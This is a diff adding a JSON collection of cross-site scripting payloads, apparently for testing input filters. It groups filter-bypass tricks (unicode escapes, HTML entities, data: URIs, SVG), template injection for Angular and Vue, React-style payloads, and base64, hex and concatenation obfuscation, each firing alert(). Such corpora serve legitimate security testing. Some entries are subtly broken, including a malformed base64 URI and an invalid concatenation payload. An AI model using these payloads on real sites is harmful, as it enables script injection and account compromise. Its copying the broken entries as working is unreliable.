@@ -1,0 +1,48 @@
+{
+    "advanced_bypass": {
+        "unicode": [
+            "<\u0073\u0063\u0072\u0069\u0070\u0074>alert(1)</\u0073\u0063\u0072\u0069\u0070\u0074>",
+            "<img src=x \u006fnerror=alert(1)>"
+        ],
+        "html_entities": [
+            "&lt;script&gt;alert&#40;1&#41;&lt;/script&gt;",
+            "&#60;img src=x &#111;nerror=alert&#40;1&#41;&#62;"
+        ],
+        "data_protocol": [
+            "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pw=='>",
+            "<iframe src='data:text/html,<script>alert(1)</script>'>"
+        ],
+        "svg_advanced": [
+            "<svg><script>href='data:text/html,<script>alert(1)</script>'</script></svg>",
+            "<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href='javascript:alert(1)'><rect width='1000' height='1000' fill='white'/></a></svg>"
+        ]
+    },
+    "framework_specific": {
+        "angular": [
+            "{{constructor.constructor('alert(1)')()}}",
+            "{{$on.constructor('alert(1)')()}}"
+        ],
+        "vue": [
+            "{{_c.constructor('alert(1)')()}}",
+            "{{$options.methods.alert(1)}}"
+        ],
+        "react": [
+            "<img src={alert(1)} />",
+            "<a href={'javascript:alert(1)'}>click</a>"
+        ]
+    },
+    "obfuscation": {
+        "base64": [
+            "<script>eval(atob('YWxlcnQoMSk='))</script>",
+            "<img src=x onerror=eval(atob('YWxlcnQoMik='))>"
+        ],
+        "hex": [
+            "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>",
+            "<img src=x onerror=eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x32\\x29')>"
+        ],
+        "concat": [
+            "<script>window['al'+'ert'](1)</script>",
+            "<img src=x onerror='al'+'ert'(1)>"
+        ]
+    }
+}
